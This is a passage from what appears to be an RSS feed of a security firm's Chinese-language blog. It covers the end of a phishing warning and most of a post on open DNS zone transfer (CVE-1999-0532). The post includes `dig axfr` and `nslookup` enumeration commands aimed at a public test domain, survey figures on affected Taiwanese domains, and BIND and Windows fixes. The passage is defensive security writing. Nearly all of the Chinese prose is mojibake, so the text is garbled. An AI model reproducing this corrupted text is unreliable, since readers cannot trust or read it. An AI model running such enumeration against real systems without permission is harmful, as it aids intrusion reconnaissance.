  &lt;li&gt;å°æ–¼ yijapperj@hotmail.com é€™ç¨®å¯ç–‘å¸³è™Ÿæ‰€å‚³ä¾†çš„ä»»ä½•è³‡æ–™ï¼Œè«‹ä¿æŒé«˜åº¦è­¦æˆ’&lt;/li&gt;
  &lt;li&gt;å°æ–¼ vote.tw.am é€™ç¨®çœ‹èµ·ä¾†ç–‘ä¼¼è¦å½è£æˆ .tw ç¶²åŸŸçš„ç«™å°ï¼Œä¹Ÿè«‹ä¿æŒé«˜åº¦è­¦æˆ’&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ­¡è¿å¤§å®¶è½‰ç™¼é€™å€‹æ¶ˆæ¯åˆ°å„å¤§ç¶²ç«™ã€ç²‰çµ²åœ˜ã€BBSï¼Œå‘Šè¨´å„å€‹ç†±å¿ƒå…¬ç›Šçš„é„‰æ°‘å€‘åˆ¥å†é»æ“Šèˆ‡å›æ‡‰ä¾†è·¯ä¸æ˜çš„ç°¡è¨Šå›‰ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site/</link>
                <guid>https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site</guid>
                <pubDate>Wed, 07 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Zone Transfer CVE-1999-0532 - å¤è€çš„ DNS è³‡å®‰è­°é¡Œ</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Domain_Name_System&quot;&gt;DNS&lt;/a&gt; æ˜¯åœ¨ 1983 å¹´ç”± Paul Mockapetris æ‰€ç™¼æ˜ï¼Œç›¸é—œè¦ç¯„åˆ†åˆ¥åœ¨ &lt;a href=&quot;http://tools.ietf.org/html/rfc1034&quot;&gt;RFC 1034&lt;/a&gt; ä»¥åŠ &lt;a href=&quot;http://tools.ietf.org/html/rfc1035&quot;&gt;RFC 1035&lt;/a&gt;ã€‚å…¶ä¸»è¦ä½œç”¨æ˜¯ç”¨ä¾†è¨˜æ†¶ IP ä½å€èˆ‡è‹±æ–‡ä¹‹é–“çš„å°æ‡‰é—œä¿‚ï¼Œè®“äººé¡å¯ä»¥ç”¨è¼ƒç°¡å–®çš„æ–¹å¼è¨˜å¾—ä¸»æ©Ÿåç¨±ã€‚ç›®å‰ä¸€èˆ¬æ°‘çœ¾å¤§å¤šä½¿ç”¨ ISP æˆ–åœ‹éš›çŸ¥åå…¬å¸æä¾›çš„ DNS serverï¼Œå¦‚ä¸­è¯çš„ 168.95.1.1 æˆ–æ˜¯ Google çš„ 8.8.8.8 ç­‰ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;ç„¶è€Œå°æ–¼ä¼æ¥­è€Œè¨€ï¼Œå¯èƒ½éœ€è¦æ¶è¨­å¤§é‡æ©Ÿå™¨æˆ–å…§éƒ¨ç³»çµ±ï¼Œåˆå¸Œæœ›ä»¥ç°¡å–®çš„æ–¹å¼è¨˜æ†¶ä¸»æ©Ÿåç¨±ï¼Œå› æ­¤è¨±å¤šä¼æ¥­æœ‰è‡ªè¡Œæ¶è¨­ DNS server çš„éœ€æ±‚ã€‚åŒæ™‚ä¼æ¥­é€šå¸¸ä¹Ÿæœƒå»ºç«‹å¹¾å°å‚™æ´ DNS serverï¼Œä»¥é¿å… DNS æœå‹™å¿½ç„¶ä¸­æ–·ã€‚ä½†æ˜¯ç•¶ä¼æ¥­æœ‰å¤šå° DNS server æ™‚ï¼Œå°±å¿…é ˆè€ƒé‡ DNS è¨˜éŒ„çš„åŒæ­¥å•é¡Œï¼Œé€šå¸¸æœƒä½¿ç”¨ &lt;a href=&quot;http://en.wikipedia.org/wiki/DNS_zone_transfer&quot;&gt;zone transfer&lt;/a&gt; é€™å€‹åŠŸèƒ½ä¾†åŒæ­¥è¨˜éŒ„ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;ç„¶è€Œè‹¥ç®¡ç†è€…æœªåšå¥½ç›¸é—œè¨­å®šï¼Œä½¿æ‰€æœ‰ä¾†æºçš†å¯å°ä¼æ¥­çš„ DNS ä¸»æ©Ÿé€²è¡Œ zone transfer æŸ¥è©¢ï¼Œå‰‡æœ‰æ©Ÿæœƒè®“æ­¤åŠŸèƒ½æˆç‚ºä¼æ¥­é­å—æ”»æ“Šçš„èµ·é»ã€‚ç”¨ç¾å¯¦ç”Ÿæ´»æƒ…å¢ƒèˆ‰ä¾‹çš„è©±ï¼Œå°å¤–é–‹æ”¾ zone transfer å°±å¦‚åŒæ‰€æœ‰äººéƒ½å¯ä»¥ä»»æ„æŸ¥è©¢ä½ åä¸‹çš„æ‰€æœ‰æˆ¿åœ°ç”¢ä½åœ¨ä½•è™•ï¼Œå‡å¦‚æœ‰äººè¦é‡å°æ€§çš„æ”»æ“Šä½ ï¼Œéš¨æ™‚éƒ½å¯ä»¥å»çœ‹ä½ æŸå€‹æˆ¿åœ°ç”¢æœ‰æ²’æœ‰å“ªæ‰‡é–€çª—æ²’é—œå¥½ï¼Œä¼ºæ©Ÿå…¥ä¾µä½ çš„å®¶åœ’ã€‚ä¸€èˆ¬æˆ‘å€‘å°ä¼æ¥­è³‡è¨Šç³»çµ±é€²è¡Œ&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;æ™‚ï¼Œåœ¨è³‡è¨Šæœé›†çš„éšæ®µä¹Ÿæœƒå…ˆå¾ domain name ä¸‹æ‰‹ï¼Œå› æ­¤ DNS ç›¸é—œè³‡æ–™çš„é‡è¦æ€§å¯è¦‹ä¸€æ–‘ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-1999-0532&quot;&gt;Zone transfer çš„è³‡å®‰è­°é¡Œæ—©åœ¨ 1999 å¹´å°±å·²æœ‰äººæå‡º&lt;/a&gt;ï¼Œç†æ‡‰æˆç‚ºå„ä¼æ¥­é€²è¡Œè³‡å®‰ç¨½æ ¸çš„æ­¥é©Ÿä¹‹ä¸€ã€‚ç„¶è€Œåäº”å¹´éå»äº†ï¼Œåœ¨è¿‘æœŸæˆ‘å€‘å»ç™¼ç¾è¨±å¤šåœ‹å…§å¤§ä¼æ¥­ä»æœ‰æ­¤å•é¡Œï¼Œä»¤äººéå¸¸é©šè¨ï¼ç©¶ç«Ÿä¼æ¥­è©²å¦‚ä½•æª¢æ¸¬è‡ªèº«æ˜¯å¦å­˜åœ¨é€™ç¨®å®‰å…¨æ¼æ´ï¼Ÿæ­¤å•é¡Œç›®å‰åœ¨å°ç£ç¶²è·¯ç’°å¢ƒä½”æœ‰å¤šå¤§çš„æ¯”ä¾‹ï¼ŸZone transfer æœƒå°ä¼æ¥­é€ æˆä»€éº¼å½±éŸ¿ï¼Ÿè®“æˆ‘å€‘ç¹¼çºŒçœ‹ä¸‹å»ï½&lt;/p&gt;

&lt;h3 id=&quot;zone-transfer-æª¢æ¸¬æ–¹å¼&quot;&gt;Zone Transfer æª¢æ¸¬æ–¹å¼&lt;/h3&gt;

&lt;p&gt;é¦–å…ˆéœ€æ„Ÿè¬ &lt;a href=&quot;http://www.digininja.org/&quot;&gt;DigiNinja&lt;/a&gt; æä¾›äº†ä¸€å€‹&lt;a href=&quot;http://www.digininja.org/projects/zonetransferme.php&quot;&gt;è®“å¤§å®¶è‡ªç”±æ¸¬è©¦çš„ zonetransfer.me ç¶²åŸŸ&lt;/a&gt;ï¼Œä»¥ä¸‹æˆ‘å€‘åˆ†åˆ¥åœ¨ Linux åŠ Windows ç’°å¢ƒä¸‹é€²è¡Œæª¢æ¸¬ã€‚&lt;/p&gt;

&lt;h4 id=&quot;linux&quot;&gt;Linux&lt;/h4&gt;

&lt;p&gt;åœ¨ Linux ç’°å¢ƒå…§ï¼Œæˆ‘å€‘å¯åˆ©ç”¨ &lt;a href=&quot;http://linux.vbird.org/linux_server/0350dns.php#dig&quot;&gt;dig&lt;/a&gt; æŒ‡ä»¤æŸ¥è©¢ç›®æ¨™ domain ä½¿ç”¨å“ªäº› name serverï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig +nostats +nocomments +nocmd NS zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Name server æŸ¥è©¢çµæœï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;zonetransfer.me.		IN	NS
zonetransfer.me.	7118	IN	NS	ns12.zoneedit.com.
zonetransfer.me.	7118	IN	NS	ns16.zoneedit.com.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å¾çµæœå¯å¾—çŸ¥æœ‰ ns12.zoneedit.com æˆ– ns16.zoneedit.com é€™å…©å€‹ DNS serverï¼Œæ¥è‘—æˆ‘å€‘å³å¯æ¸¬è©¦æ˜¯å¦å¯å¾å¤–éƒ¨ç¶²è·¯å°é€™å…©å€‹ DNS server é€²è¡Œ zone transferï¼Œæ¸¬è©¦æ–¹å¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig axfr zonetransfer.me @ns12.zoneedit.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Zone transfer æ¸¬è©¦çµæœï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; title=&quot;ä½¿ç”¨ dig æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; alt=&quot;ä½¿ç”¨ dig æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot; title=&quot;ä½¿ç”¨ dig æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾ä¸Šé¢çš„æ¸¬è©¦çµæœä¸­æˆ‘å€‘å¯ç™¼ç¾ï¼Œzonetransfer.me é€™å€‹ç¶²åŸŸçš„æ‰€æœ‰ DNS è¨­å®šå·²å…¨éƒ¨è¢«åˆ—å‡ºã€‚&lt;/p&gt;

&lt;h4 id=&quot;windows&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;è‹¥æ˜¯åœ¨ Windows ç’°å¢ƒï¼Œå¯åœ¨å‘½ä»¤æç¤ºå­—å…ƒç’°å¢ƒå…§ä½¿ç”¨ &lt;a href=&quot;http://support.microsoft.com/kb/200525/zh-tw&quot;&gt;nslookup&lt;/a&gt; æŒ‡ä»¤æŸ¥è©¢ç›®æ¨™ domain ä½¿ç”¨å“ªäº› name serverï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup -type&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ns zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Name server æŸ¥è©¢çµæœï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
zonetransfer.me	&lt;span class=&quot;nv&quot;&gt;nameserver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns12.zoneedit.com.
zonetransfer.me	&lt;span class=&quot;nv&quot;&gt;nameserver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns16.zoneedit.com.

Authoritative answers can be found from:&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;è¼¸å…¥æŒ‡ä»¤å¾Œæˆ‘å€‘å¦‚åŒå…ˆå‰ä½¿ç”¨ dig ä¸€æ¨£ï¼Œå¾—çŸ¥ç›®æ¨™æœ‰ ns12.zoneedit.com èˆ‡ ns16.zoneedit.com é€™å…©å€‹ name serverï¼Œæ¥è‘—å†å¦‚ä¸‹åœ–ä¾åºè¼¸å…¥ä¸‰é“æŒ‡ä»¤æŸ¥è©¢ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup

server ns12.zoneedit.com

ls -d zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;è¨»ï¼šLinux ç‰ˆçš„ nslookup æ²’æœ‰å¯¦ä½œ ls é€™å€‹åŠŸèƒ½å–”ï¼&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Zone transfer æ¸¬è©¦çµæœï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; title=&quot;ä½¿ç”¨ nslookup æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; alt=&quot;ä½¿ç”¨ nslookup æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot; title=&quot;ä½¿ç”¨ nslookup æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ¸¬è©¦çµæœèˆ‡ Linux ç’°å¢ƒæ‰€å¾—åˆ°çš„è³‡æ–™é›·åŒï¼Œå¯æˆåŠŸåˆ—å‡ºè©²ç¶²åŸŸçš„æ‰€æœ‰ DNS è¨­å®šã€‚&lt;/p&gt;

&lt;h4 id=&quot;online-service&quot;&gt;Online Service&lt;/h4&gt;

&lt;p&gt;ç•¶ç„¶ï¼Œä¸¦ä¸æ˜¯æ¯å€‹äººéƒ½ç†Ÿæ‚‰ä¸Šè¿°æŒ‡ä»¤çš„æ“ä½œæ–¹å¼ï¼Œå› æ­¤é™¤äº†ä»‹ç´¹æ‰‹å‹•æª¢æ¸¬æ–¹æ³•ä¹‹å¤–ï¼Œåœ¨é€™è£¡ä¹Ÿæä¾›å¹¾å€‹ç·šä¸Šæª¢æ¸¬çš„æœå‹™ï¼Œè®“å¤§å®¶å¯ä»¥è¿…é€Ÿæª¢æ¸¬è‡ªå®¶å…¬å¸æˆ–è€…ä½ æ­£åœ¨ä½¿ç”¨çš„æœå‹™æ˜¯å¦æœ‰æ­¤å•é¡Œï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ultratools.com/tools/zoneFileDump&quot;&gt;UltraTools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://hackertarget.com/zone-transfer/&quot;&gt;HackerTarget&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://tools.digitalpoint.com/zone-transfer&quot;&gt;Digital Point&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å¯¦éš›æ¡ˆä¾‹&quot;&gt;å¯¦éš›æ¡ˆä¾‹&lt;/h3&gt;

&lt;p&gt;å¦‚åŒä¸Šæ¬¡ &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP Headers è³‡å®‰è­°é¡Œ&lt;/a&gt;æ‰€æ¢è¨çš„å°è±¡ï¼Œæˆ‘å€‘å¾ TIEA æˆå“¡ä»¥åŠ Alexa TW top 525 è§€å¯Ÿ zone transfer å•é¡Œåˆ†åˆ¥åœ¨é€™äº›æ—ç¾¤ä¸­ä½”æœ‰å¤šå°‘æ¯”ä¾‹ã€‚&lt;/p&gt;

&lt;p&gt;æ ¹æ“šæˆ‘å€‘ç›£æ¸¬çš„çµæœï¼Œåœ¨ç›®å‰ TIEA çš„ 132 åæˆå“¡ä¸­ï¼Œæœ‰ 20 å€‹ç¶²åŸŸå­˜åœ¨ zone transfer å•é¡Œï¼Œä½”äº† 15.15%ã€‚è€Œåœ¨ Alexa TW top 525 ç•¶ä¸­ï¼Œæœ‰ 48 å€‹ç¶²åŸŸå­˜åœ¨ zone transfer å•é¡Œï¼Œä½”äº† 9.14%ã€‚ä¹çœ‹ä¹‹ä¸‹æ¯”ç‡ä¼¼ä¹ä¸é«˜ï¼Œä½†æ˜¯åœ¨ä¸Šè¿°å…©å€‹æ—ç¾¤çš„ç¶²åŸŸç•¶ä¸­ï¼ŒåŒ…æ‹¬ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;é›»ä¿¡å•†&lt;/li&gt;
  &lt;li&gt;å¤šå®¶é›»è¦–åª’é«”&lt;/li&gt;
  &lt;li&gt;å¤šå®¶ç¶²è·¯æ–°èåª’é«”&lt;/li&gt;
  &lt;li&gt;å¤šå®¶ç·šä¸Šè³¼ç‰©ç¶²ç«™&lt;/li&gt;
  &lt;li&gt;çŸ¥ååœ˜è³¼ç¶²ç«™&lt;/li&gt;
  &lt;li&gt;çŸ¥åé‡‘æµå…¬å¸&lt;/li&gt;
  &lt;li&gt;çŸ¥åç·šä¸ŠéŸ³æ¨‚æœå‹™&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å°ç£ä¼æ¥­ä¸å¤ æ³¨é‡è³‡è¨Šå®‰å…¨ï¼Œç½”é¡§å®¢æˆ¶è³‡æ–™å®‰å…¨æ€§ï¼Œæ—©å·²ä¸æ˜¯æ–°èã€‚ç„¶è€Œè‹¥ä¼æ¥­ä¸é¡§è‡ªèº«å•†æ¥­åˆ©ç›Šèˆ‡è²¬ä»»ï¼Œç•¶å½¼æ­¤ç„¡å•†æ¥­å¾€ä¾†æ™‚ï¼Œæˆ‘å€‘ä¹Ÿç„¡æ³•ä¸€ä¸€å’è²¬ã€‚ä½†è‹¥é€£å°åŒ—å¸‚æ”¿åºœã€æ•™è‚²éƒ¨ã€å¤šé–“å¤§å°ˆé™¢æ ¡éƒ½æœ‰æ­¤å•é¡Œï¼Œå°±ä»¤äººä¸å¤ªèƒ½æ¥å—äº†ï¼Œé€™äº›æ”¿åºœå–®ä½èˆ‡æ•™è‚²æ©Ÿæ§‹ç†ç•¶ç‚ºæˆ‘å€‘çš„å€‹äººè³‡æ–™å®‰å…¨æ€§è² èµ·å…¨éƒ¨çš„è²¬ä»»ï¼Œä¸æ‡‰è©²æ¼æ‰ä»»ä½•ä¸€å€‹è³‡å®‰ç’°ç¯€ã€‚ä¸Šè¿°çµæœé¡¯ç¤ºå‡ºå°ç£å¾æ”¿åºœåˆ°ä¼æ¥­å¯èƒ½éƒ½æ²’æœ‰å¾¹åº•è½å¯¦ DNS çš„è³‡å®‰è¨­å®šï¼Œè€Œä¸”ç›®å‰çš„æ•¸æ“šåƒ…åƒ…æ˜¯é‡å° TIEA æˆå“¡ä»¥åŠ Alexa TW top 525 é€²è¡Œæª¢æ¸¬ï¼Œè‹¥æ˜¯å°å…¨å°ç£æˆ–æ˜¯å…¨ä¸–ç•Œé€²è¡Œå¤§ç¯„åœçš„æª¢æ¸¬ï¼Œææ€•æœƒç™¼ç¾æ›´å¤šé©šäººçš„æ¡ˆä¾‹ï¼&lt;/p&gt;

&lt;h3 id=&quot;å°ä¼æ¥­çš„æ½›åœ¨å½±éŸ¿&quot;&gt;å°ä¼æ¥­çš„æ½›åœ¨å½±éŸ¿&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;æ´©æ¼ç¶²åŸŸåç¨±&lt;/p&gt;

    &lt;p&gt;ä¸€èˆ¬ä¼æ¥­åœ¨é€²è¡Œ&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;æ™‚ï¼Œé€šå¸¸åªæœƒæŒ‘å¹¾å€‹æœ€é‡è¦ã€æœ€å¸¸é¢å°å®¢æˆ¶çš„ç¶²åŸŸé€²è¡Œæ¸¬è©¦ï¼Œä½†æ˜¯å…¥ä¾µè€…å¯ä¸æœƒé€™éº¼ä¹–ã€‚ç•¶æœ‰äººå˜—è©¦è¦å…¥ä¾µä¼æ¥­æ™‚ï¼Œå¿…å®šæ˜¯å…ˆé€²è¡Œå…¨é¢çš„åµæŸ¥ï¼Œè§€å¯Ÿä¼æ¥­å“ªå¹¾å€‹ç¶²åŸŸæ‰€åŸ·è¡Œçš„ service æœ‰æ½›åœ¨çš„å¼±é»ï¼Œæˆ–æ˜¯çœ‹å“ªå¹¾å€‹ç¶²åŸŸé˜²ç¦¦åŠ›é“è¼ƒå¼±ï¼Œå†å¾è©²è™•ä¸‹æ‰‹ã€‚å› æ­¤ zone transfer å•é¡Œæ‰€æä¾›çš„å®Œæ•´ DNS è¨˜éŒ„ï¼Œå°±ç‚ºå…¥ä¾µè€…çœä¸‹äº†è¨±å¤šåµæŸ¥çš„å·¥å¤«ã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ´©æ¼å¤–ç¶² IP ç¯„åœ&lt;/p&gt;

    &lt;p&gt;ç•¶æ”»æ“Šè€…å–å¾— zone transfer æ‰€æ´©æ¼çš„è³‡æ–™å¾Œï¼Œå¯åˆç†æ¨æ–·å“ªäº›ç¶²æ®µæ˜¯å±¬æ–¼è©²ä¼æ¥­ï¼Œé€²ä¸€æ­¥å°è©²ç¶²æ®µé€²è¡Œæƒæï¼Œå˜—è©¦æ‰¾å°‹æœ‰æ©Ÿæœƒå…¥ä¾µä¹‹æ¨™çš„ç‰©ã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ´©æ¼å…§ç¶² IP ç¯„åœ&lt;/p&gt;

    &lt;p&gt;æœ‰äº›ç®¡ç†äººå“¡ã€é–‹ç™¼è€…ç‚ºæ±‚å…§éƒ¨é–‹ç™¼æ–¹ä¾¿ï¼Œç¶“å¸¸æœƒå°‡ç¶²åŸŸåç¨±è·Ÿå…§ç¶² IP ä½å€ç¶åœ¨ä¸€èµ·ï¼Œä¾‹å¦‚å°‡ phpmyadmin.example.com è¨­å®šç‚º 192.168.1.100ï¼Œæ”»æ“Šè€…å°±å¯æ ¹æ“šæ­¤é¡è³‡è¨ŠçŒœæ¸¬å…§ç¶²å“ªäº›ç¶²æ®µå­˜åœ¨é‡è¦æœå‹™ã€‚é€™ç¨®è¨­å®šå¹³å¸¸ä¹Ÿè¨±ä¸æœƒé€ æˆé‡å¤§æå®³ï¼Œä½†æ˜¯ç•¶ç®¡ç†è€…ç–æ–¼å»ºç«‹å…§ç¶²é˜²ç¦¦æ©Ÿåˆ¶ï¼Œæ°å¥½ä¼æ¥­åˆè¢«å…¥ä¾µè‡³å…§ç¶²æ™‚ï¼Œé€ æˆä¸€é€£ä¸²é‡å¤§æå¤±çš„æ©Ÿç‡å°‡æœƒå¤§å¹…æé«˜ã€‚&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è§£æ±ºæ–¹å¼&quot;&gt;è§£æ±ºæ–¹å¼&lt;/h3&gt;

&lt;h4 id=&quot;linux-1&quot;&gt;Linux&lt;/h4&gt;

&lt;p&gt;è‹¥ä½¿ç”¨ Linuxï¼Œå¯åœ¨ /etc/named.conf å…§åŠ å…¥ä¸‹åˆ—é¸é …ï¼Œä»¥é™åˆ¶å¯å­˜å– zone transfer çš„ä¾†æºï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;options &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    allow-transfer &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        1.2.3.4&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        5.6.7.8&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;è¨­å®šå®Œç•¢å¾Œï¼Œå°‡ DNS æœå‹™é‡å•Ÿå³å¯ç”Ÿæ•ˆã€‚&lt;/p&gt;

&lt;h4 id=&quot;windows-1&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;åœ¨ Windows server ç•¶ä¸­ï¼Œæˆ‘å€‘å¯åˆ°ä¼ºæœå™¨ç®¡ç†å“¡ä¿®æ”¹ç¶²åŸŸçš„ç›¸é—œè¨­å®šï¼Œå¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; title=&quot;æ–¼ä¼ºæœå™¨ç®¡ç†å“¡ä¿®æ”¹ç¶²åŸŸçš„ zone transfer è¨­å®š&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; alt=&quot;æ–¼ä¼ºæœå™¨ç®¡ç†å“¡ä¿®æ”¹ç¶²åŸŸçš„ zone transfer è¨­å®š&quot; title=&quot;æ–¼ä¼ºæœå™¨ç®¡ç†å“¡ä¿®æ”¹ç¶²åŸŸçš„ zone transfer è¨­å®š&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ä¼ºæœå™¨ç®¡ç†å“¡ä¸­ï¼Œé¸å®šæƒ³è¦ä¿®æ”¹çš„ç¶²åŸŸï¼ˆæ­¤è™•ä»¥ test.com ç‚ºä¾‹ï¼‰ï¼ŒæŒ‰å³éµé»é¸å…§å®¹ï¼Œå°‡æœƒè·³å‡ºé¸å–®å¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; title=&quot;ä¿®æ”¹ test.com çš„ zone transfer è¨­å®š&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; alt=&quot;ä¿®æ”¹ test.com çš„ zone transfer è¨­å®š&quot; title=&quot;ä¿®æ”¹ test.com çš„ zone transfer è¨­å®š&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘—å°±æ˜¯è§€çœ‹ã€Œå…è¨±å€åŸŸè½‰é€ã€é¸é …æ˜¯å¦æœ‰å‹¾é¸ï¼Œè‹¥å·²å‹¾é¸ï¼Œå‰‡ç¢ºèªè½‰é€å°è±¡æ˜¯å¦ç‚ºä¸‹åˆ—å…©ç¨®ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;åªåˆ°åˆ—åœ¨ã€Œåç¨±ä¼ºæœå™¨ç´¢ã€å¼•æ¨™ç°½ä¸Šçš„ä¼ºæœå™¨&lt;/li&gt;
  &lt;li&gt;åªåˆ°ä¸‹åˆ—ä¼ºæœå™¨&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;tcp-53-port&quot;&gt;TCP 53 port&lt;/h4&gt;

&lt;p&gt;DNS åœ¨åš zone transfer æ™‚æ˜¯ä½¿ç”¨ TCP 53 portï¼ˆæœ‰åˆ¥æ–¼ä¸€èˆ¬ DNS query çš„ UDP 53 portï¼‰ï¼Œå› æ­¤æœ‰äº›äººæœƒèªç‚ºå°‡ TCP 53 port é—œé–‰å°±å¯ä»¥å°ä»˜ zone transferï¼Œè€Œä¸æƒ³ä¿®æ”¹ zone transfer çš„è¨­å®šã€‚å…¶å¯¦é€™å€‹è§€å¿µåªå°äº†ä¸€åŠï¼Œè‹¥ zone file çš„è³‡æ–™å°æ–¼ 512 byteï¼Œä»ç„¶å¯ä»¥é€é UDP å‚³è¼¸ã€‚å³ä½¿ zone file çš„è³‡æ–™å¤§æ–¼ 512 byteï¼Œ&lt;a href=&quot;http://securityweekly.com/2011/11/incremental-zone-transfers-for.html&quot;&gt;ä¹Ÿå¯ä»¥ç”¨ Incremental Zone Transfer (IXFR) çš„æ–¹å¼å–å¾—éƒ¨åˆ†è³‡æ–™&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

